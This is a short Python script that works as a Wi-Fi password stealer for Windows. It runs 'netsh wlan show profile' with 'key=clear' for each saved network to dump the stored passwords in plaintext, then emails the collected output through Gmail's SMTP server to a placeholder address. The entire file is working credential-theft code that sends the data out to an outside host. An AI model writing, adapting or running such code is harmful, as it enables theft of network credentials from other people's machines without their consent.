#!usr/bin/env python
import subprocess, smtplib
import re

def send_email(address, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(address, password)
    server.sendmail(address,address, message)
    server.quit()

command = "netsh wlan show profile"
profiles = subprocess.check_output(command, shell=True).decode("utf-8", "backslashreplace")
names = re.findall("(?:Profile\s*:\s*)(.*)", profiles)

result = "".encode("utf-8")
for network in names: 
    network = network.replace("\r", "")
    customCommand = command + " \"" + str(network) + "\" key=clear" 
    result = result + subprocess.check_output(customCommand, shell=True)

send_email("email@gmail.com", "passkey", result)
